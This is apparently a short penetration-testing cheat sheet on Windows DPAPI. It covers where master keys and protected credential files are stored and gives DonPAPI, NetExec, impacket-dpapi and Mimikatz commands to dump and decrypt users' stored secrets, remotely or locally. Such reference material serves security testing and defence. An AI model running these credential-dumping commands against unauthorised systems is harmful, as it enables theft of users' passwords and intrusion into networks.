# DPAPI

The `DPAPI` (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password.

They are usually located at:

```sh
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```

Below are common paths of hidden files that usually contain DPAPI-protected data.

```sh
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```

### Dumping secrets

{% tabs %}
{% tab title="DonPapi" %}
```sh
# Remotely extract a user's DPAPI secrets. Also works with PtH and Kerberos auth
https://github.com/login-securite/DonPAPI
donpapi collect -u <USER> -p <PASSWORD> -d <DOMAIN> -t <IP>

nxc smb <IP> -u <USER> -p <PASSWORD> --dpapi
```
{% endtab %}

{% tab title="Impacket" %}
```sh
# Exfiltrate and dump => decrypt the masterkey, then use it to decrypt the files
# The SID can be found in the path leading to the masterkey file 
impacket-dpapi masterkey -file <MASTERKEY_FILE> -sid '<SID>'
impacket-dpapi credential -file <CREDS_FILE> -key '<DECRYPTED_KEY>'
```
{% endtab %}

{% tab title="Mimikatz" %}
```sh
# Local dumping
sekurlsa::dpapi   # Gives the masterkey
dpapi::cred /in:"<PATH_TO_ENCRYPTED_FILE>" /masterkey:<MASTERKEY>
```
{% endtab %}
{% endtabs %}
